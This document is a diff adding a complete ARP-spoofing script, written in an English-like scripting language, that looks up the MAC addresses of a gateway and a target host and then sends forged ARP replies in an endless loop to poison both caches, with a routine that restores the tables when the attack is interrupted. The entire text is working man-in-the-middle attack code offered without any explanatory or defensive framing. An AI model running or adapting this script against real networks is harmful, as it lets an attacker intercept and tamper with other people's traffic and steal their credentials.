@@ -1,0 +1,61 @@
+set interface to "en0"
+set gateway_ip to "192.168.1.1"
+set target_ip to "192.168.1.205"
+define a task named "get_mac" that accepts "ip_address" of type String and returns a String.
+    create a new "Packet" with layers "Ether/ARP" and call it arp_request.
+    set arp_request's dst to "ff:ff:ff:ff:ff:ff".
+    set arp_request's pdst to ip_address.
+    send packet arp_request and store the reply in arp_reply.
+    return arp_reply's hwsrc.
+end task
+
+define a task named "spoof_arp" that accepts "iface" of type String, "gateway" of type String, "target" of type String.
+    perform "get_mac" with target and store the result in target_mac.
+    perform "get_mac" with gateway and store the result in gateway_mac.
+    create a new "Packet" with layers "ARP" and call it reply_to_target.
+    set reply_to_target's op to 2.
+    set reply_to_target's psrc to gateway.
+    set reply_to_target's hwdst to target_mac.
+    set reply_to_target's pdst to target.
+    create a new "Packet" with layers "ARP" and call it reply_to_gateway.
+    set reply_to_gateway's op to 2.
+    set reply_to_gateway's psrc to target.
+    set reply_to_gateway's hwdst to gateway_mac.
+    set reply_to_gateway's pdst to gateway.
+    while true is true.
+        send packet reply_to_target and store the reply in dummy_reply1.
+        send packet reply_to_gateway and store the reply in dummy_reply2.
+        show me "Sent ARP replies: " + gateway + " <-> " + target + "."
+    end while
+end task
+
+define a task named "restore_arp" that accepts "gateway" of type String, "target" of type String.
+    perform "get_mac" with target and store the result in target_mac.
+    perform "get_mac" with gateway and store the result in gateway_mac.
+    create a new "Packet" with layers "ARP" and call it restore_packet_for_target.
+    set restore_packet_for_target's op to 2.
+    set restore_packet_for_target's psrc to gateway.
+    set restore_packet_for_target's hwsrc to gateway_mac.
+    set restore_packet_for_target's hwdst to target_mac.
+    set restore_packet_for_target's pdst to target.
+    create a new "Packet" with layers "ARP" and call it restore_packet_for_gateway.
+    set restore_packet_for_gateway's op to 2.
+    set restore_packet_for_gateway's psrc to target.
+    set restore_packet_for_gateway's hwsrc to target_mac.
+    set restore_packet_for_gateway's hwdst to gateway_mac.
+    set restore_packet_for_gateway's pdst to gateway.
+    set count to 0.
+    while count is less than 4.
+        send packet restore_packet_for_target and store the reply in dummy1.
+        send packet restore_packet_for_gateway and store the reply in dummy2.
+        add 1 to count.
+    end while
+    show me "Clean up."
+end task
+
+try to
+    perform "spoof_arp" with interface, gateway_ip, target_ip.
+on error
+    show me "Attack interrupted. Restoring ARP tables..."
+    perform "restore_arp" with gateway_ip, target_ip.
+end try
